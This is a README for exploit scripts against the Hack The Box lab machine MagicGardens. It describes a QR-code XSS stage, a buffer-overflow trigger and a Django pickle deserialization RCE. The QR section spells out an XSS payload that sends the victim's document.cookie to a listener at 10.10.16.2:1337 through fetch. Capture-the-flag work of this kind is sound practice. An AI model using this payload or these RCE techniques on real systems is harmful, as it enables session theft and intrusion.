# HTB MagicGardens

Scripts for [HTB MagicGardens](https://www.hackthebox.com/machines/magicgardens) machine.

---

## Create QR Codes
To generate QR codes in a simple Python script first install `qrcode` library:
```shell-session
❯ pip3 install "qrcode[pil]"
```
and then just generate the QR code with the desired url (or `XSS` payload):
```shell-session
❯ python3 generate_qrcode.py 'd81b8f9a242f10a5aed7a2070f264629.0d341bcdc6746f1d452b3f4de32357b9.<img src=x onerror=fetch("http://10.10.16.2:1337/"+btoa(document.cookie));>'
```


---

## Buffer Overflow
Create a private key with `ssh-keygen` and add its content to the script

## Usage
```shell-session
❯ python3 trigger_harvest.py
```
Execute this script while running `Harvest` binary from `HTB MagicGardens` binary.

---

## DJango Pickle Deserialization RCE

## Usage
First, install `DJango` for version prior to `5.0`, since `Pickle` has been deprecated for that version, in a virtual environment:
```shell-session
❯ python3 -m venv .venv_django

❯ source .venv_django/bin/activate

❯ pip3 install "django<5.0"
```
Then, create needed directories to execute it:
```shell-session
❯ mkdir django_exp && cd django_exp

❯ mkdir app

❯ touch app/__init__.py

❯ touch app/settings.py
```
Finally, just execute the script after modifying the source code with the command you want to run:
```shell-session
❯ python3 django_pickle_exp.py
```
